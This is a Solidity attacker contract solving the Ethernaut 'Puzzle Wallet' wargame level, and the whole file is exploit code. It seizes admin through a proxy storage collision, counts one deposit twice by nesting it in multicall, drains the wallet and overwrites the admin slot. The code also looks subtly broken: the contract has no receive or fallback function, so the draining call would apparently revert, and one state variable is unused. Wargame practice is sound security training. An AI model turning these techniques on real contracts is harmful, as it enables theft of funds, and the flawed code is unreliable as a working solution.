// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IPuzzleWallet } from "ethernaut/24-puzzle-wallet/IPuzzleWallet.sol";

contract PuzzleWalletAttacker is Ownable2Step {
    uint256 private constant PUZZLE_WALLET_BALANCE = 0.001 ether;
    bool private s_switch;
    IPuzzleWallet private s_puzzleWallet;

    function exploit(address _puzzleWalletAddr) external payable onlyOwner {
        IPuzzleWallet puzzleWallet = IPuzzleWallet(_puzzleWalletAddr);
        s_puzzleWallet = IPuzzleWallet(_puzzleWalletAddr);
        puzzleWallet.proposeNewAdmin(address(this));
        puzzleWallet.addToWhitelist(address(this));

        bytes memory callDeposit = abi.encodeCall(puzzleWallet.deposit, ());
        bytes[] memory multicallCalls = new bytes[](1);
        multicallCalls[0] = callDeposit;
        bytes memory callMulticall = abi.encodeCall(puzzleWallet.multicall, (multicallCalls));
        bytes[] memory calls = new bytes[](2);
        calls[0] = callDeposit;
        calls[1] = callMulticall;
        puzzleWallet.multicall{value: PUZZLE_WALLET_BALANCE}(calls);

        puzzleWallet.execute(address(this), address(puzzleWallet).balance, "");
        puzzleWallet.setMaxBalance(uint256(uint160(address(this))));
        // NB: just in case the level requires that msg.sender is the admin, and not just an admin change
        puzzleWallet.proposeNewAdmin(msg.sender);
        puzzleWallet.approveNewAdmin(msg.sender);
    }
}
